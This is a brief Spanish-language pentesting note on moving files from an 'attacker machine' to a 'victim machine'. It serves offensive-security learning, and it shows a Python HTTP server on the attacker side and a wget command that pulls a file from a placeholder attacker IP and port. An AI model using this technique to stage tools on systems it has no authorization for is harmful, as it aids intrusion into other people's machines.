
---

Para transferir un archivo de una maquina atacante a una maquina victima existen multitud de posibilidades, en esta nota se mostraran las técnicas que vaya descubriendo:

- montando un servidor http con **python**

```bahs
python3 -m http.server <puerto donde lo queremos montar>
```

```bash 
wget <ip-maquina-atacante>:<puerto-atacante>/recursoADescargar(nombre con extension)
```

ACLARACION para facilitar la descarga montar el servidor python en la maquina atacante estando en el directorio que contiene el archivo que queremos traspasar 